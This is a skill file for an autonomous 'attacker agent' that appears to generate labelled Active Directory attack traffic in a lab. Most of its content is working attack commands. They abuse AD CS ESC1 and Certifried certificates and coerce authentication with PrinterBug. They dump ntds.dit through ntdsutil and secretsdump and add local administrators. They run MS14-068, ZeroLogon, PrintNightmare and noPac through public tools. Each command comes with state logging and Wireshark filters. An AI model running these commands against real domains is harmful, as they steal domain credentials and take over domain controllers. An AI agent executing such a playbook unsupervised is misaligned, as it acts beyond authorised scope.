---
name: ad-privesc
description: Privilege-escalation Active Directory skill for an attacker agent on a domain-joined Windows host. Covers AD CS ESC1, unconstrained delegation, printerbug coerce, Backup Operators NTDS IFM, local SAM group add, and five classic published CVEs (MS14-068, ZeroLogon, PrintNightmare, noPac, Certifried). Load this skill when the task names ad-privesc. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Privilege Escalation Skill

Load this skill **only** when the dispatched task names `ad-privesc`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

**CVE policy.** Only the five classic published CVEs in sections 11–15 are allowed. Do not invent 0day/1day exploits or write exploit source into this skill. Call a lab-installed public tool (`python -m <module>`). If the tool is missing, record `notes` and skip — same as BloodHound.

# Privilege Escalation

## 1. AD CS Enumeration

- Technique id: `privesc.adcs-find`
- ATT&CK: T1649 (Steal or Forge Authentication Certificates)

Purpose: enumerate AD Certificate Services templates and CAs with `certipy`.

Inputs: a user object with `password` from `users`, plus `domain.name` and `domain.dc_ip`. Requires `certipy` (`pip install certipy-ad`; runs as `certipy`). If the tool is missing, record the missing capability in `notes` and skip this technique.

Procedure (one atomic action):

```
certipy find -u <user>@<domain.name> -p <password> -dc-ip <domain.dc_ip>
```

Outputs:

```
python scripts/state.py add files '{"path": "<certipy-find-output>", "description": "AD CS template/CA enumeration"}'
```

Rollback: re-run if the CA list is incomplete.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || tcp.port == 389 || tcp.port == 636 || tcp.port == 88)
```


## 2. AD CS ESC1 Request

- Technique id: `privesc.adcs-esc1`
- ATT&CK: T1649 (Steal or Forge Authentication Certificates)

Purpose: request a certificate from an ESC1-vulnerable template. Do **not** modify template ACLs. If the template does not allow the request, mark the technique `failed`.

Inputs: a user object with `password` from `users`, `domain.dc_ip`, a CA name and template name from `privesc.adcs-find` output in `files[]` (or named in the task). Requires `certipy`. If missing, `notes` + skip.

Procedure (one atomic action):

```
certipy req -u <user>@<domain.name> -p <password> -dc-ip <domain.dc_ip> -ca <ca-name> -template <template> -upn administrator@<domain.name>
```

Outputs:

```
python scripts/state.py add files '{"path": "<pfx-path>", "description": "ESC1 certificate pfx"}'
```

Rollback: if issuance is denied, mark `failed` — do not edit the template.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || tcp.port == 389 || tcp.port == 88) || (tcp.port == 135 || tcp.port == 445)
```


## 3. AD CS Certificate Auth (PKINIT)

- Technique id: `privesc.adcs-auth`
- ATT&CK: T1550 (Use Alternate Authentication Material), T1649

Purpose: authenticate with a `.pfx` via PKINIT and obtain a TGT.

Inputs: a `.pfx` path in `files[]` (from `privesc.adcs-esc1` or `privesc.certifried`), plus `domain.dc_ip`. Requires `certipy`. If missing, `notes` + skip.

Procedure (one atomic action):

```
certipy auth -pfx <pfx-path> -dc-ip <domain.dc_ip> -domain <domain.name>
```

Outputs:

```
python scripts/state.py add tickets.tgt '{"principal": "<upn>", "ccache_file": "<ccache>"}'
python scripts/state.py add files '{"path": "<ccache>", "description": "TGT from certipy auth"}'
```

Rollback: if PKINIT fails, `mark-stale` the pfx file and re-request.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 4. PrinterBug Coerce

- Technique id: `privesc.printerbug`
- ATT&CK: T1187 (Forced Authentication)

Purpose: coerce a host (often a DC) to authenticate to a listener via the Print Spooler RPC. This is authentication coercion, not a memory-corruption exploit.

Inputs: a user object with `password` from `users`, a coerce target (usually `domain.dc_ip`), and a listener IP already in `state` (attack host or another `hosts[]` IP).

Procedure (one atomic action):

```
python -m impacket.examples.printerbug <domain.name>/<user>:<password>@<target-ip> <listener-ip>
```

Outputs:

```
python scripts/state.py add notes '{"text": "printerbug coerce <target-ip> -> <listener-ip>"}'
```

Rollback: re-run if the spooler is unavailable; mark `failed` if RPC is refused.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)) || (ip.addr == <target-ip> && ip.addr == <listener-ip> && (smb || tcp.port == 445))
```


## 5. Unconstrained Delegation TGT

- Technique id: `privesc.unconstrained-tgt`
- ATT&CK: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)

Purpose: obtain a TGT usable on an unconstrained-delegation computer listed in `domain.delegation`.

Inputs: `domain.delegation` (from `lateral.delegation-enum`) containing an unconstrained entry, plus a user object with `password` or a machine account password for that host.

Procedure (one atomic action):

```
python -m impacket.examples.getTGT -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Outputs:

```
python scripts/state.py add tickets.tgt '{"principal": "<user>", "ccache_file": "<user>.ccache"}'
```

Rollback: if the TGT is rejected, `mark-stale` the credential and re-run `lateral.delegation-enum`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 6. Backup Operators NTDS IFM

- Technique id: `privesc.backup-ntds`
- ATT&CK: T1003.003 (OS Credential Dumping: NTDS)

Purpose: use Backup Operators (or equivalent) rights to create an `ntdsutil` IFM copy on the DC. Distinct from `credential.dcsync` (DRSUAPI) and from `credential.ntds-dit` only in the required group; the command is the IFM path.

Inputs: a user object in Backup Operators (or Domain Admins) with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<domain.dc_ip> 'ntdsutil "activate instance ntds" ifm "create full C:\Windows\Temp\ifm" q q'
```

Then `smbclient` `use C$` and `get` `Windows\Temp\ifm\Active Directory\ntds.dit` plus the SYSTEM hive.

Outputs:

```
python scripts/state.py add files '{"path": "ntds.dit", "description": "Backup Operators IFM ntds.dit from <dc-ip>"}'
```

Rollback: if access is denied, mark `failed` (wrong group) — do not add the user to Backup Operators in AD.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 7. Local Administrators Group Add

- Technique id: `privesc.localgroup-add`
- ATT&CK: T1098 (Account Manipulation)

Purpose: add a user to the **local** Administrators group on a compromised host (SAM), not an AD group. Do not run `net group "Domain Admins"`.

Inputs: an admin user object with `password` from `users`, the target host, and the account to add (from `users[]`).

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'net localgroup administrators <domain.name>\<member> /add'
```

Outputs:

```
python scripts/state.py merge hosts[<index>] '{"compromised": true}'
python scripts/changes.py add '{"kind": "other", "technique_id": "privesc.localgroup-add", "target": "<target-ip>", "summary": "Added <member> to local Administrators on <target-ip>", "reversal": "net localgroup administrators <member> /delete /server:<target-ip>"}'
```

Rollback: if the add is rejected, `mark-stale` and retry with a working admin credential. Never add to AD groups.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 8. AlwaysInstallElevated

- Technique id: `privesc.always-install-elevated`
- ATT&CK: T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)

Purpose: read the remote `AlwaysInstallElevated` policy. This technique is a registry query; do not write the policy keys.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.reg <domain.name>/<user>:<password>@<target-ip> query -keyName 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer'
```

Also query `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` if HKLM is present. Record whether `AlwaysInstallElevated` is `1`.

Outputs:

```
python scripts/state.py add notes '{"text": "AlwaysInstallElevated on <target-ip>: <value>"}'
```

Rollback: re-query if the host is unreachable.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 9. Unquoted Service Path

- Technique id: `privesc.unquoted-service`
- ATT&CK: T1574.009 (Hijack Execution Flow: Unquoted Service Path)

Purpose: enumerate service binary paths on a host and note unquoted paths with spaces. Do not overwrite existing service binaries.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'wmic service get name,displayname,pathname,startmode'
```

Outputs:

```
python scripts/state.py add notes '{"text": "unquoted service paths on <target-ip>: <names>"}'
```

Rollback: re-enumerate if the host list is stale.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 10. SYSTEM Scheduled Task

- Technique id: `privesc.schtask-system`
- ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)

Purpose: create a one-shot scheduled task on an already-compromised host that runs as SYSTEM. Distinct from `persistence.scheduled-task` (logon persistence).

Inputs: an admin user object with `password` from `users`, the target host, and a command (task-text intent or `campaign.tools`).

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'schtasks /create /tn <task-name> /tr "<command>" /sc once /st 00:00 /ru SYSTEM /f & schtasks /run /tn <task-name>'
```

Outputs:

```
python scripts/state.py add files '{"path": "<task-name>", "description": "SYSTEM scheduled task on <target-ip>"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "privesc.schtask-system", "target": "<target-ip>", "summary": "Created SYSTEM task <task-name>", "reversal": "schtasks /delete /s <target-ip> /tn <task-name> /f"}'
```

Rollback: if the task fails to run, `mark-stale` and recreate. Do not modify existing tasks.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 11. MS14-068 Golden PAC (CVE-2014-6324)

- Technique id: `privesc.ms14-068`
- CVE: CVE-2014-6324
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets)

Purpose: forge a PAC with the public impacket `goldenPac` example (classic Kerberos vulnerability). Do not write a custom exploit.

Inputs: a user object with `password` from `users`, plus `domain.name` and `domain.dc_fqdn`.

Procedure (one atomic action):

```
python -m impacket.examples.goldenPac <domain.name>/<user>:<password>@<domain.dc_fqdn>
```

Outputs:

```
python scripts/state.py add tickets.tgt '{"principal": "<user>", "ccache_file": "<user>.ccache"}'
```

Rollback: if the DC is patched, mark `failed` and record a `notes` entry. Do not fall back to a different CVE.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || smb || msrpc || tcp.port == 88 || tcp.port == 445 || tcp.port == 135)
```


## 12. ZeroLogon (CVE-2020-1472)

- Technique id: `privesc.zerologon`
- CVE: CVE-2020-1472
- ATT&CK: T1210 (Exploitation of Remote Services)

Purpose: use a **lab-installed public** ZeroLogon module to reset the DC machine-account password, dump NTDS, then **immediately restore** that password. This is the only allowed in-place modification of an existing AD computer account, and only for this technique.

Requires the public `zerologon` module (`python -m zerologon`). If it is not installed, record `notes` and skip — do not write an exploit.

Inputs: `domain.netbios` (or DC NetBIOS from `hosts[]`), `domain.name`, `domain.dc_ip`. Unauthenticated.

Procedure (one atomic action — exploit, dump, restore; do not stop between steps):

```
python -m zerologon <dc-netbios> <domain.dc_ip>
python -m impacket.examples.secretsdump -just-dc -no-pass '<domain.name>/<dc-netbios>$'@<domain.dc_ip>
python -m impacket.examples.restorepassword -target-ip <domain.dc_ip> '<domain.name>/<dc-netbios>$'@<domain.dc_ip> -hexpass <hex-from-secretsdump>
```

If restore fails after the password was changed, mark the technique `failed`, record `changes.json`, and **end the task**. Do not continue the campaign until an operator restores the DC machine account.

Outputs:

```
python scripts/state.py add users '{"username": "krbtgt", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "source": "privesc.zerologon"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "privesc.zerologon", "target": "<dc-netbios>$", "summary": "CVE-2020-1472 temporary DC$ password reset (must be restored)", "reversal": "python -m impacket.examples.restorepassword -target-ip <dc-ip> <domain>/<dc-netbios>$@<dc-ip> -hexpass <hex>"}'
```

Rollback: restore is mandatory inside this technique, not an operator-later step.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 13. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

- Technique id: `privesc.printnightmare`
- CVE: CVE-2021-1675, CVE-2021-34527
- ATT&CK: T1068 (Exploitation for Privilege Escalation)

Purpose: invoke a **lab-installed public** PrintNightmare tool against a host's spooler. Do not write a payload DLL or a custom exploit. If the public tool is missing, `notes` + skip.

Inputs: a user object with `password` from `users`, plus the target host. The UNC DLL path must already exist in `campaign.tools` or `files[]` (operator-preseeded). If no UNC path is in state, skip.

Procedure (one atomic action). Prefer a module, then a PATH script:

```
python -m CVE_2021_1675 <domain.name>/<user>:<password>@<target-ip> '<unc-dll>'
```

If `python -m CVE_2021_1675` is not importable, run `CVE-2021-1675.py` only when that file is already on PATH or in `campaign.tools`. Never create the `.py` or DLL.

Outputs:

```
python scripts/state.py merge hosts[<index>] '{"compromised": true}'
python scripts/state.py add notes '{"text": "PrintNightmare against <target-ip>"}'
```

Rollback: if the spooler is patched, mark `failed`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 14. noPac sAMAccountName Spoof (CVE-2021-42278 / CVE-2021-42287)

- Technique id: `privesc.nopac`
- CVE: CVE-2021-42278, CVE-2021-42287
- ATT&CK: T1134.005 (Access Token Manipulation: SID-History Injection)

Purpose: run a **lab-installed public** noPac tool. Operate only on a **new** machine account created by this technique; delete it afterwards. Do not rename an existing DC object permanently.

Requires `python -m noPac`. If missing, `notes` + skip — do not write an exploit.

Inputs: a user object with `password` from `users`, `domain.dc_ip`, `domain.dc_fqdn`.

Procedure (one atomic action):

```
python -m noPac <domain.name>/<user>:<password> -dc-ip <domain.dc_ip> -dc-host <domain.dc_fqdn>
```

If the tool created a computer account, remove it with `addcomputer -delete` (same new name) and record `changes.json`.

Outputs:

```
python scripts/state.py add tickets.tgt '{"principal": "<user>", "ccache_file": "<ccache>"}'
python scripts/changes.py add '{"kind": "create_machine_account", "technique_id": "privesc.nopac", "target": "<created-computer>$", "summary": "Temporary machine account for noPac (deleted after use)", "reversal": "Remove-ADComputer -Identity <created-computer>$"}'
```

Rollback: if patched, mark `failed`. Always delete the created machine account.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || smb || tcp.port == 389 || tcp.port == 88 || tcp.port == 445)
```


## 15. Certifried (CVE-2022-26923)

- Technique id: `privesc.certifried`
- CVE: CVE-2022-26923
- ATT&CK: T1649 (Steal or Forge Authentication Certificates)

Purpose: abuse machine-account `dNSHostName` on an **attacker-created** computer with `certipy`. Do not edit an existing computer object's DNS name.

Requires `certipy`. If missing, `notes` + skip.

Inputs: a user object with `password` from `users` that can create machine accounts (default MAQ), `domain.dc_ip`, `domain.dc_fqdn`, and a CA name (from `privesc.adcs-find` or the task).

Procedure (one atomic action — create computer with DC DNS name, request machine cert):

```
certipy account create -u <user>@<domain.name> -p <password> -dc-ip <domain.dc_ip> -user <new-computer>$ -pass <new-password> -dns <domain.dc_fqdn>
```

Then (same technique, same CA):

```
certipy req -u <new-computer>$@<domain.name> -p <new-password> -dc-ip <domain.dc_ip> -ca <ca-name> -template Machine
```

Outputs:

```
python scripts/state.py add users '{"username": "<new-computer>$", "password": "<new-password>", "is_machine_account": true, "source": "privesc.certifried"}'
python scripts/state.py add files '{"path": "<pfx-path>", "description": "Certifried machine certificate"}'
python scripts/changes.py add '{"kind": "create_machine_account", "technique_id": "privesc.certifried", "target": "<new-computer>$", "summary": "Created computer for CVE-2022-26923", "reversal": "certipy account delete -u <user>@<domain> -p <password> -dc-ip <dc-ip> -user <new-computer>$"}'
```

Rollback: if the CA refuses, mark `failed`. Delete only the computer this technique created.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || tcp.port == 389 || tcp.port == 88 || tcp.port == 135 || tcp.port == 445)
```
